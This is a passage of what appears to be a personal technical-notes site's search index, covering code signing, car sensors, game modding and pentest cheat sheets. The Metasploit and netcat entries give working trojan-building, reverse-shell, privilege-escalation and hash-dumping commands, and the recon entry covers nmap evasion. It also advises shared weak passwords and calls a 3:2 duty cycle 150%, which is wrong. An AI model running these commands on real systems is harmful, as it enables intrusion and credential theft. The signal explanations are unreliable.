CMS format), openssl (generate certificates), xcrun (validate/notarize utility), csreq (code signing utility), rcodesign (3rd party code signing utiltiy) Display valid Code Signing identities of the MacOS\n# You need to create \u0026#34;Code Signing\u0026#34; certificates from the Keychain Access $ xcrun security find-identity -v -p codesigning 1) 1C8177C2xxxxxxxxxxxxxxxxxxx6C565999Dxxxx \u0026#34;signature\u0026#34; 2) E8B3B406xxxxxxxxxxxxxxxxxxx6C8EA4A38xxxx \u0026#34;mycert\u0026#34; 3) 3F4806E9xxxxxxxxxxxxxxxxxxx173A6C3C8xxxx \u0026#34;Apple Development: Developer Name (SXXXXXXXX7)\u0026#34; 3 valid identities found # ... or ... $ security find-identity -p basic -v # display all installed certificates 1) 1C8177C2xxxxxxxxxxxxxxxxxxx6C565999Dxxxx \u0026#34;signature\u0026#34; 2) E8B3B406xxxxxxxxxxxxxxxxxxx6C8EA4A38xxxx \u0026#34;mycert\u0026#34; 3) 3F4806E9xxxxxxxxxxxxxxxxxxx173A6C3C8xxxx \u0026#34;Apple Development: Developer Name (SXXXXXXXX7)\u0026#34; 3 valid identities found Display CodeSign information of the App.\n$ codesign -dvvv /Application/SomeApp.app # Verbose Executable=/private/tmp/SomeApp.app/Contents/MacOS/SomeApp Identifier=com.durakiconsulting.someapp Format=app bundle with Mach-O universal (x86_64 arm64) ... TeamIdentifier=2XXXXXXXX5 # ... or ... $ codesign -dv -r- /Applications/SomeApp.app # Base Attributes Executable=/Applications/SomeApp.app/Contents/MacOS/SomeApp ... Display (in)validity of the CodeSign Identity\n$ codesign --verify -vv --no-strict /Applications/SomeApp.app /Applications/SomeApp.app: invalid signature (code or signature have been modified) In architecture: x86_64 Clear Extended Attributes\n$ xattr -lr /Applications/SomeApp.app # to see which files are causing errors/codesign issues $ xattr -cr /Applications/SomeApp.app # remove all extended attributes from the app bundle $ xattr -c /Applications/SomeApp.app/\u0026lt;file path\u0026gt; # clear extended attributes of several files X.509 Certificate Format\n$ rcodesign x509-oids # =\u0026gt; to print OIDs for x.509 certs 1.3.6.1.5.5.7.3.3\tCodeSigning 1.2.840.113635.100.6.1.1\tAppleSigning 1.2.840.113635.100.6.1.2\tIPhoneDeveloper ... Resources OS X Frameworks TN3125: Inside Code Signing: Provisioning Profiles TN3126: Inside Code Signing: Hashes TN3127: Inside Code Signing: Requirements Using the Latest Code Signature Format Certificate, Key, and Trust Services App Groups Entitlement Tools: iOSValidation, codesign ", 
        "url": "\/macos-reverse-engineering\/"
    },
    
    
    
    "\/magnetoresistive-sensors\/": {
        
        "title": "Magnetoresistive Sensors",
        "tags": [],
        "content": "This type of sensor is particulary suitable for advanced stability control applications, in which sensing at zero, or near zero speed is required.\nA permanent magnet in the sensor produces a magnetic field, with the magnetic field stream at a right angle to the sensing element\nThe sensor element is ferromagnetic alloy. It changes its resistance based on the influence of magnetic fields.\nIf the high portion of the pulse wheel approaches the sensing element, a deflection of the magnetic field stream is created. This creates a resistance change in a thin film ferromagnetic layer of the sensor element.\nAn example of magnetoresistive sensors components is as following:\nExample - Magnetoresistive Sensors Component After assembly of listed components, such magnetoresistive sensor will look like this:\nExample - Post-assembly of listed Components The sensor element is affected by the direction of the magnetic field (not the field strength).\nThe field strength is not important, as long as it is/above certain level. This allows the sensor to tolerate variations in the magnetic field strength (caused by age, temperature, mechanical lifetime \u0026hellip;). The resistance change in the sensor affects the voltage that is supplied by the evaulation circuit. A small amount of voltage is provided to the sensor elment; which is monitored, and the voltage changes (1 to 100mV) are converted into current pulses by the evaulation module.\nConversion of voltages to current pulses if sensor element voltage is changed The sensor is supplied 12V by the Control Unit. Output voltage from the sensor is approximately 10V. The Control Unit counts the high and low current pulses to determine the wheel speed.\nTypical Application of Hall Effect Sensors Currently used for wheel speed sensors ", 
        "url": "\/magnetoresistive-sensors\/"
    },
    
    
    
    "\/metasploit-framework\/": {
        
        "title": "Metasploit Framework",
        "tags": [],
        "content": "Create executable trojan\n$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)\n$ msfconsole ... [loaded] msf5 exploit(multi/handler) \u0026gt; use multi/handler msf5 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; set LHOST 192.168.153.128 LHOST =\u0026gt; 192.168.153.128 msf5 exploit(multi/handler) \u0026gt; set LPORT 8888 LPORT =\u0026gt; 8888 msf5 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 192.168.153.128:8888 [*] Sending stage (179779 bytes) to 192.168.153.133 [*] Meterpreter session 1 opened (192.168.153.128:8888 -\u0026gt; 192.168.153.133:49915) at 2020-06-21 11:27:30 +0200 meterpreter \u0026gt; ls Listing: C:\\trojan ================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100777/rwxrwxrwx 73802 fil 2020-06-21 11:27:13 +0200 dolphin.exe Common Commands\nGet SYSTEM shell\n$ meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). $ getuid SYSTEM\\* Get available privileges\n$ meterpreter \u0026gt; getprivs Enabled Process Privileges Name: SeBackupPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeCreatePagefilePrivilege SeCreateSymbolicLinkPrivilege SeDebugPrivilege SeImpersonatePrivilege SeIncreaseBasePriorityPrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege SeLoadDriverPrivilege SeManageVolumePrivilege SeProfileSingleProcessPrivilege SeRemoteShutdownPrivilege SeRestorePrivilege SeSecurityPrivilege SeShutdownPrivilege SeSystemEnvironmentPrivilege SeSystemProfilePrivilege SeSystemtimePrivilege SeTakeOwnershipPrivilege SeTimeZonePrivilege SeUndockPrivilege Dump hashes\n$ meterpreter \u0026gt; hashdump **--\u0026gt; usually error, we can use kiwi (load kiwi) or mimikatz (load mimikatz) View Kiwi or Hashdump\n## =\u0026gt; kiwi method $ load kiwi $ meterpreter \u0026gt; lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : SUPERASME SysKey : 2191beee37c928bbf9e2de8f685b5227 Local SID : S-1-5-21-716707718-802779726-1162805411 SAMKey : 3d3b9a321a53397e7082da89be862a1e RID : 000001f4 (500) User : Administrator RID : 000001f5 (501) User : Guest RID : 000001f7 (503) User : DefaultAccount RID : 000001f8 (504) User : WDAGUtilityAccount Hash NTLM: dfa827b88238ba5def8e431fe9503a34 RID : 000003e9 (1001) User : Asmir Hadzic Hash NTLM: ed2ae0d1f7e22ca3187d8e8d91d968c7 ## =\u0026gt; hashdump method meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 2191beee37c928bbf9e2de8f685b5227... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa827b88238ba5def8e431fe9503a34::: Asmir Hadzic:1001:aad3b435b51404eeaad3b435b51404ee:ed2ae0d1f7e22ca3187d8e8d91d968c7::: Other Commands\nMeterpreter consists of a large number of commands which are categorized in their respective categories, namely:\nCore Commands STDapi : File Commands STDapi : Networking Commands STDapi : File- System Commands STDapi : User Interface Commands STDapi : Web Cam Commands Priv : Elevate Commands Priv : Password database Commands Priv : Time Stomp commands ", 
        "url": "\/metasploit-framework\/"
    },
    
    
    
    "\/modding-uplink-by-introversion\/": {
        
        "title": "Modding Uplink by Introversion",
        "tags": [],
        "content": "Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.\nChanging the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read. You can change this behaviour by patching address:\n00000001000cdd28 mov ecx, 0xa ; argument #4 for method sub_1000a2da0 What this does is replace the default Uplink UI font size from 9 to 10, making it appear larger on the screen and more easier to read. Looking at the source code, the following item is present:\n// taken from: uplink/src/uplink.cpp void Init_Fonts\t() { ... success = (GciLoadTrueTypeFont ( HELVETICA_10, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 9 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_12, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 11 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_18, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 16 )); The above fixes the first call of GciLoadTrueTypeFont() function, and changing the default mov ecx, 0x9 to mov ecx, 0xa¬†(10). Produce a new binary and run it from MacOS application directory. Voi-la! üéâ\nReferences: uplink/src/uplink.cpp\nDefinitions Some interesting definitions have been identified.\nGame World and Mapped Data\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.h` #define\tWORLD_START_DATE\t0, 0, 0, 24, 2, 2010\t#define\tGAME_START_DATE\t0, 0, 0, 24, 3, 2010\t// ;) #define\tPLAYER_START_BALANCE\t3000 #define\tPLAYER_START_GATEWAYNAME\t\u0026#34;Gateway ALPHA \u0026#34; #define\tPLAYER_START_CPUTYPE\t\u0026#34;CPU ( 60 Ghz )\u0026#34; #define\tPLAYER_START_MODEMSPEED\t1 #define\tPLAYER_START_MEMORYSIZE\t24 // also see #define\tIP_LOCALHOST\t\u0026#34;127.0.0.1\u0026#34; // also see #define\tTICKSREQUIRED_* #define\tTRACESPEED_* #define\tHACKDIFFICULTY_* #define\tPROB_MISSION_* #define\tPAYMENT_* #define MINDIFFICULTY_* #define TIME_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* Global App Defines\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/app/globals_defines.h` #define\tALPHA\t0.85f\t// Alpha value used for interface #define\tALPHA_DISABLED\t0.5\t// Alpha value for disabled buttons //#define\tCHEATMODES_ENABLED\t// Eg all-links, all-software, password-bypass etc Game Data, Titles, World Map Gateways, SW/HW Upgrades\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.cpp` UPLINKRATING [] NEUROMANCERRATING [] PHYSICALGATEWAYLOCATIONS [] SOFTWARE_UPGRADES [] ", 
        "url": "\/modding-uplink-by-introversion\/"
    },
    
    
    
    "\/modulated-square-wave-signals\/": {
        
        "title": "Modulated Square Wave Signals",
        "tags": [],
        "content": "A Modulated Square Wave is a series of High/Low signals repeated rapidly.\nA Modulated Square Wave appears as a High/Low signal, repeated rapidly over and over Like the switched signal B+ and B-, the square wave has only two voltage levels. These are: High Level and Low Level.\nA modulated square wave has 3 characteristics that can be modified to vary the required signal:\nFrequency Pulse Width Duty Cycle Frequency The frequency of a modulated square wave signal is the number of complete cycles or pulses, that occur in one second (fq = O(cycle)^1sec). This number of cycles (or frequency) is expressed in Hertz (Hz). 1Hz = 1 complete cycle per second.\nAn output function may use a fixed or varied frequency.\nDifferent number of cycles per one (1) second - e.g. Frequency Herz In the above picture, we can conclude: if 10Hz/sec then the sensor operates at frequency of 10Hz, else it\u0026rsquo;s operating on 20Hz, 100Hz and so on.\nThe frequency is fixed if the cycles operating in one second is constant. If cycles operating in one second is not constant, we call them varied frequency.\nTypical Application of Fixed and Varied Frequency Fixed\nThrottle command from EMS2000 to EDR Varied\nHall Effect Crank Sensor Hall Effect Wheel Speed Sensor Hall Effect Camshaft Sensor Pulse Width The Pulse Width of a signal is the length of time a pulse is running. Vehicle systems may use fixed or varied ON times/pulse width. Pulse width is expressed in milliseconds (ms).\nPulse Width - Time it takes for a single portion of a Frequency Cycle (in milliseconds) In above example, a period of a full cycle equals to pulse width multipled by twice; (since a cycle has a high cycle, and low cycle) - ON/OFF state.\nDuty Cycle The Duty Cycle of a Square Wave is the ratio of ON time to OFF time for one single cycle. Duty cycle is expressed in percentage (%).\nIn short, Duty Cycle is the ratio/percentage difference between ON/OFF Pulses. If the Square Wave signal consists of 3/ON pulses, and 2/OFF pulses, the ratio is 3/2, which means the Duty Cycle is ~150% for one signel cycle.\nVehicle systems use both fixed duty cycle signals, and also variable duty signals.\nDuty Cycle ratio in different cycle signals Time\n1 second = 1000 milliseconds (ms) 1/4 second = 250 milliseconds 1/100 second = 10 milliseconds 1/2 second = 500 milliseconds 1/10 second = 100 milliseconds 1/1000 second = 1 millisecond ", 
        "url": "\/modulated-square-wave-signals\/"
    },
    
    
    
    "\/mounting-sd-cards\/": {
        
        "title": "Mounting SD Cards",
        "tags": [],
        "content": "MacOS Instructions The instructions below are only viable for MacOS based Host operating systems. For Linux, please refer to [/linux-notes].\nMounting ext4 Linux partition Check MacOS Notes for detailed instructions. todo: move the instructions in this document\nMounting boot partition Insert your SD Card in the Card Reader Open Terminal and enter following commands # =\u0026gt; if one fails, try the other one $ sudo mount /Volumes/boot -o remount,rw $ sudo mount -uw /Volumes/boot You should be able to write to boot partition now, ie.:¬†touch /Volumes/boot/hey.txt. See Raspberry Pi Quick Guide on how to enable SSH via this method.\nLinux Instructions todo: add linux instructions, if required.\nOther Tricks Labeling OS image on the SD Card\nIt is sometimes confusing to maintain large number of SD Cards, over large number of SBCs. To easily identify multiple SD Cards from each other, you can simply create a text file in /boot partition of your microSD with meaningful names, ie:\n\u0026lt;sdcard\u0026gt;/boot/os-kali-linux.txt or \u0026lt;sdcard\u0026gt;/boot/os-raspbian.txt are meaningful names, and it\u0026rsquo;s easily identified without needing for a boot. Just insert microSD in your card reader, and open the /boot partition.\nUse Simple Authentication\nUse simple user and password authentication across all images, ie: pi:pi for all Raspberries, Lemaker\u0026rsquo;s Boards and other SBCs. That way you don\u0026rsquo;t need to remember each and all of them.\nhint: additionally, add the user:pass auth combo in the /boot/os-*.txt file, described in Labeling OS image on the SD Card.\nSet Wi-Fi Network Credentials in wpa_supplicant.conf\nIn the /boot/ partition, create a new file wpa_supplicant.conf, and save it like this:\n# =\u0026gt; wpa_supplicant.conf ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=BA network={ ssid=\u0026#34;The Matrix\u0026#34; psk=\u0026#34;wifi-password-1234\t\u0026#34; key_mgmt=WPA-PSK } ", 
        "url": "\/mounting-sd-cards\/"
    },
    
    
    
    "\/netcat-tricks\/": {
        
        "title": "netcat tricks",
        "tags": [],
        "content": "Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|victim machine| On \u0026ldquo;attackers machine\u0026rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:\n$ sudo iptables -F $ sudo ncat -nlvp 9999 On \u0026ldquo;victim machine\u0026rdquo; (target), connect to netcat listener:\n$ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.\nFor probe direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|attacker box|\u0026lt;-------\u0026gt;|victime machine| On \u0026ldquo;attackers box\u0026rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.\n$ sudo iptables -F # =\u0026gt; important! $ sudo ncat --broker 9999 # =\u0026gt; creates a broker for probing On \u0026ldquo;attackers machine\u0026rdquo; (see above):\n$ sudo ncat [attacker box] 9999 On \u0026ldquo;victim machine\u0026rdquo;:\n$ sudo ncat ", 
        "url": "\/netcat-tricks\/"
    },
    
    
    
    "\/network-lab\/": {
        
        "title": "Network Lab",
        "tags": [],
        "content": "Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.\n# sets ipv4; netmask and gw for the vpc PC1\u0026gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2\u0026gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:\nPC1\u0026gt; save Saving startup configuration to startup.vpc . done Advanced Topology Corporate Topology SCADA Topology ", 
        "url": "\/network-lab\/"
    },
    
    
    
    "\/network-recon\/": {
        
        "title": "Network Recon",
        "tags": [],
        "content": "External Network Engagement nmap oneliners (do-it-all) + fw evasion\n$ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 \u0026lt;target\u0026gt; basic recon\n$ nslookup set type=NS x.x.x.x basic nmap\n$ sudo nmap -sS 80.101.121.42 # syn scan first $ sudo nmap -O 80.101.121.42 # os detection $ sudo nmap -sV -sS 80.101.121.42 -p 8089 # service detection $ nc 80.101.121.42 8089 # try connecting via detected ports basic masscan\n$ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 -eutun2 # =\u0026gt; via vpn tunnel (tun2) $ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 # =\u0026gt; default eth nmap exoitc firewall evasion rules\nBypassing Firewall Rules ping gateway ipv4 address\n$ nmap -sn -v -PE 192.168.*.1 dns enumeration\n$ dig ‚Äìt any example.ba revere DNS lookup\n$ sudo nmap -sL x.x.x.x identity alive ipv4\n$ sudo nmap-sn-n x.x.x.x asn/bgp extractoion\nBGP View BGP.he.net reverse ip domain lookup\nDomainstools zoomeye search\nzoomeye additional nmap scripts\n# =\u0026gt; Basic Recon nmap -n p80,\u0026lt;port\u0026gt;,... --script http-enum x.x.x.x nmap -v --script dos x.x.x.x sudo nmap -v --script vuln x.x.x.x nmap -n -p --script dns-brute x.x.x.x # =\u0026gt; Vuln scan nmap -sV --script=vulners x.x.x.x sudo nmap -sV -Pn -p4000-4433,8000-8089,80-443,9000-9443 --script=vulscan/vulscan x.x.x.x firewall evasion\nFirewall Penetration Test # =\u0026gt; Firewall Hopping $ nmap --script=firewalk --traceroute x.x.x.x # =\u0026gt; Firewall Vulnerability Scanning $ nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV -p$PORT x.x.x.x run specific nmap scripts on specific port\n‚îå‚îÄ‚îÄ(kali„âøkali)-[/usr/share/nmap/scripts] ‚îî‚îÄ$ sudo nmap --script \u0026#34;+http-*\u0026#34; x.x.x.x -p4433,8089,80,9443 discover vhost on the target\nVirtual Host Enumeration $ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; x.x.x.x -Pn PUT directly to server\n$ nmap -p 4433,8089 x.x.x.x --script http-put --script-args http-put.url=\u0026#39;/\u0026#39;,http-put.file=\u0026#39;fileput.txt\u0026#39; -Pn detecet WAF\n$ nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 x.x.x.x -Pn --top-ports=100 SSL scan\n$ nmap -sV --script ssl-dh-params x.x.x.x -Pn -p4433,8089,80,9443,443 heartbleed scan\n$ nmap -sV --script ssl-heartbleed x.x.x.x -Pn -p4433,8089,80,9443,443 known SSL keys\n$ nmap -sV --script ssl-known-key x.x.x.x -Pn -p4433,8089,80,9443,443 check for POODLE\n$ nmap -sV --version-light --script ssl-poodle -p4433,8089,80,9443,443 x.x.x.x -Pn check for SSLv2 DROWN\n$ nmap -sV --script=sslv2-drown -p4433,8089,80,9443,443 x.x.x.x -Pn try banner grabbing\n$ nc -nvv x.x.x.x 4433 (UNKNOWN) [???] 4433 (?) open try dumping pcap files\n$ sudo tcpdump -ttttnnr tcp_dump.pcap tcpdump -qns 0 -A -r blah.pcap Toolset NWPentestUtils ", 
        "url": "\/network-recon\/"
    },
    
    
    
    "\/network-reverse-engineering\/": {
        
        "title": "Network Reverse Engineering",
        "tags": [],
        "content": "Using wireshark is explained in seperated documentation. Please refer to Wireshark documentation for more extensive cheatsheet.\nusing fritap¬†to analyse network traffic encapsulated in SSL or TLS\nfritap is a Python package that can be used to analyze network traffic on SSL/TLS transport layers. Works on SSL/TLS and supports all major operating systems (MacOS, iOS, Linux, Windows, Android). It is based on frida, therefore it require frida-server¬†to be up and running on the iOS/Android device.\nInstall fritap¬†with the following command:\n$ pip3 install fritap $ friTap -h # friTap -m # attach to Android or iOS process # friTap -k \u0026lt;key_path\u0026gt; # log the keys used for TLS traffic # friTap -l # create a named pipe in /tmp/sharkfin which can be read by wireshark # friTap -p \u0026lt;pcap_file\u0026gt; # name of the PCAP file to write # friTap -s # spawn the executable instead of attaching # friTap -v, --verbose # show verbose output # friTap --enable_spawn_gating # catch newly spawned processes # friTap \u0026lt;app/pid\u0026gt; # executable/app whose SSL calls to log Usage examples:\nFor Linux/Windows/MacOS we can easily attach to a process by entering its name or its PID\n$ friTap --pcap AppName.pcap AppName # =\u0026gt; store pcap file and trace an application For Mobile applications, we need to append -m parameter to indicate attaching/spawning an Android or iOS app.\n$ friTap -m --pcap AppName.pcap com.durakiconsulting.app # =\u0026gt; store pcap file and trace a mobile application To log keys of the TLS traffic, you can use:\n$ friTap -m -spawn --keylog AppKeyLogFile.log com.durakiconsulting.app Using fritap in Python as a module:\n# =\u0026gt; from a command-line interface as a module $ sudo -E python3 -m friTap.friTap --pcap AppName.pcap AppName # =\u0026gt; directly invokation via Bash script $ which friTap # =\u0026gt; /home/\u0026lt;USER\u0026gt;/.local/bin/friTap $ sudo -E /home/\u0026lt;USER\u0026gt;/.local/bin/friTap Supported SSL/TLS implementations:\n| Library | Linux | Windows | MacOSX | Android | iOS | |---------------------------|---------------|---------------|----------|----------|--------------| | OpenSSL | Full | R/W-Hook only | TBI | Full | TBI | | BoringSSL | Full | R/W-Hook only | KeyEo | Full | KeyEo | | NSS | R/W-Hook only | R/W-Hook only | TBI | TBA | TBI | | GnuTLS | R/W-Hook only | R/W-Hook only | TBI | Full | TBI | | WolfSSL | R/W-Hook only | R/W-Hook only | TBI | Full | TBI | | MbedTLS | R/W-Hook only | R/W-Hook only | TBI | Full | TBI | | Bouncycastle/Spongycastle | TBA | TBA | TBA | Full | TBA | | Conscrypt | TBA | TBA | TBA | Full | TBA | Usage Documentation Android TLS Traffic Analysis Frida script to intercept encrypted APIs in iOS apps\nfrida-ios-intercept-api is a tool that can help intercept encrypted APIs in iOS apps. Banking Apps are constantly securing their production environments. One of the security measures I\u0026rsquo;ve came across is encrypted request/response data when communicating with HTTPS services. Some weak encryptions can be decrypted easily, but some stronger encryptions like RSA are difficult to tackle.\nDuring a penetration testing of an iOS mobile application, I usually set a MITM proxy to intercept such traffic, build the API on the fly, and then attacking it. Unfortunately, this is not so easy with banking applications and e-Wallets; infact, most of the time these type of apps. uses end-to-end encrypted API, where the usual proxy interceptor (ie. Portswigger\u0026rsquo;s BurpSuite) can not see what content does the API body contain. This method uses hooking technique to dump functions content that send and receives the network traffic data, right before¬†they are encrypted.\nDownload and clone the repository to get started:\n$ git clone https://github.com/noobpk/frida-ios-intercept-api To use this script, first head out to Hopper Disassembler and identify the classes and methods the target iOS app use for network traffic; such is:\n@class MobileBankingAppRequest (method: [sendRequest:]) @class MobileBankingAppResponse (method: [getResponse:]) Configure handlers.js file\n# =\u0026gt; set the identified classes and methods responsible for req/resp /*Request Class \u0026amp; Method*/ var search_request_class = [\u0026#39;MobileBankingAppRequest\u0026#39;]; var search_request_method = [\u0026#39;sendRequest:\u0026#39;]; /*Response Class \u0026amp; Method*/ var search_response_class = [\u0026#39;MobileBankingAppResponse\u0026#39;]; var search_response_method = [\u0026#39;getResponse:\u0026#39;];` # =\u0026gt; debug the arguments of the method /*DEBUG REQUEST */ console.log(colors.green,\u0026#34;[debug_request] Dump Arugment in method: \u0026#34;,colors.resetColor); print_arguments(args); console.log(ObjC.Object(args[3])); var message1 = ObjC.Object(args[2]); var message2 = ObjC.Object(args[3]); var message3 = ObjC.Object(args[4]); console.log(\u0026#39;msg1=\u0026#39; + message1.toString() + \u0026#34;,type: \u0026#34;+ message1.$className); console.log(\u0026#39;msg2=\u0026#39; + message2.toString() + \u0026#34;,type: \u0026#34;+ message2.$className); console.log(\u0026#39;msg3=\u0026#39; + message3.toString() + \u0026#34;,type: \u0026#34;+ message3.$className); /* DEBUG RESPONSE */ console.log(colors.green,\u0026#34;[debug_response] Dump Arugment in method: \u0026#34;,colors.resetColor); # ... Use PortSwigger BurpSuite Proxy with provided Configuration .json:\nLoad burpsuite_configuration_proxy.json in BurpSuite Proxy Run python echoServer.py which acts as the proxy tunnel Configure and optimize handlers.js for your environment Run python burpTracer.py -p com.durakiconsulting.bankapp # [-n \u0026lsquo;BankApp\u0026rsquo;] Hopefully, this will yield the traffic in your Terminal $stdout.\nusing netstat (xnu) to print TCP entries for a specific PID\n$ netstat -anvp tcp | awk \u0026#39;{ if ($9 == PID) print }\u0026#39; # =\u0026gt; ie. # $ netstat -anvp tcp | awk \u0026#39;{ if ($9 == 1105) print }\u0026#39; ## tcp4 0 0 192.168.0.25.52952 52.0.253.194.443 ESTABLISHED 131072 131072 1105 0 0x0102 0x00000000 ## tcp4 0 0 127.0.0.1.45112 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 ## tcp4 0 0 127.0.0.1.30666 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 using netstat (xnu) to dump inet, tcp or udp sockets\n$ netstat -anvp inet/tcp/udp # =\u0026gt; pick one # =\u0026gt; other shorthands: inet,inet6,pfkey,atalk,netgraph,ipx,unix,link,sctp,udp,ddp (man netstat) using netstat (linux) to match a host to a socket\n$ netstat -a -c | grep -i example.com toolset\nfuzzotron - A TCP/UDP based network daemon fuzzer written in C sslsplit - Transparent SSL/TLS interception ProtoDump - Obtain proto definition files using the Objective-C and Google Protobuf runtimes dwarf_NetworkRequests - dwarf script to collect network requests, no need to unpin, hooks on low level functions netzob - Netzob: Protocol Reverse Engineering, Modeling and Fuzzing ", 
        "url": "\/network-reverse-engineering\/"
    },
    
    
    
    "\/ntc-sensors\/": {
        
        "title": "NTC Sensors",
        "tags": [],
        "content": "NTC (Negative Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.\nWhen a temperature goes up, the resistance goes down. This decrease in resistance causes the voltage drop across the sensor to decrease. Therefore, the input signal voltage at the Control Module decreases.\nTypical Sensor Signal Check PTC Sensors as well as NTC/PTC Sensor Troubleshooting for more details on this kind of Sensors.\nTypical Application of NTC Type Sensor Engine Coolant Temp Sensor Transmission Temp Sensor T-MAP Sensor IHKA Interior Air Temp Sensor \u0026hellip; ", 
        "url": "\/ntc-sensors\/"
    },
    
    
    
    "\/opcrouter-research\/": {
        
        "title": "OPCRouter Research",
        "tags": [],
        "content": "OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:\nOPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**) Windows Server 2016 \u0026amp; 2012 R2 Windows 10 (also IoT) \u0026amp; 8.1 OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**) Windows Server 2012 R1 \u0026amp; 2008 R2 Windows 8.0 \u0026amp; 7 What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft\u0026rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.\nELI5: OPC is a \u0026ldquo;standard\u0026rdquo; used to share data in ICS between PC\u0026rsquo;s and:\nEnterprise Application, User Interfaces, Transport Layer, PLC \u0026amp; Devices Usually, all vendors implements their own PLC Data Sharing Protocol which creates a large inconsistency and implementation in SCADA\u0026rsquo;d environment. OPC Foundation published an OPC standard for Automation Industry Organization and Industrial Control Systems.\nOPC Standards OPC offers a standard to Software Interface, decopupled from HMI/SCADA which is a great advantage. It comes usually in two parts:\nOPC Server - Exposes PLC memory address and label them as Tags. Tags are friendly name that maps to memory register in the PLC. Decouples the OPC Client from underlying DPMR. OPC Client - Used to connect to OPC Server and read respectable tags. OPC Data Access (OPC DA) - Browse infra for available OPC Servers. Browse OPC Server for tags and data. Can read/write Tags in a single call. Can subscribe to Tags for firing events in case of value(s) change. Blocking call therefore suspectable to DoS attack. Can lookup locations based on Cache or Device. OPC Unified Architecture (OPC UA) - This is new standard that will replace, modernize and enhance all the functionality of the existing OPC defined interfaces. OPC UA is described in a layered set of specifications broken into Parts. Basically, an \u0026ldquo;updated\u0026rdquo; OPC Standard. OPC Data Exchange (OPC DX) - Substandard/proto of OPC Standard. Other terminology:\nHMI - Human Machine Interface SCADA - Supervisory Control \u0026amp; Data Acquisition DDE - Dynamic Data Exchange PLC - Programmable Logic Controller DCS - Distributed Control System ‚Äì purposes as a PLC, but highly optimized for process control, i.e. chemicals, oil/gas, food/beverage, pharmaceutical RTU - Remote Terminal Unit ‚Äì traditionally proprietary hardware ‚Äì as today PLCs can be used for RTU\u0026rsquo;s Register ‚Äì a memory location in a PLC or DCS. To some a register is a 16 bit word of data Tag, or Item ‚Äì a single unit of data ‚Äì can be digital or analog values, or even arry DCOM - Basically a protocol on top of Microsoft\u0026rsquo;s COM for RPC (Remote Procedure Call), offers communication between COM-based applications over the network. OPC Reverse Engineering All downloaded installations, the OPCRouter and OPCServer (KEPServerEX) from the download page visible are put for further reuse into ./Installations directory.\nThe OPC Router connects systems vertically and horizontally, from sensors and controls to ERP and the cloud, from printers and scales to MES, SCADA or LIMS.\nVendor\n### inray 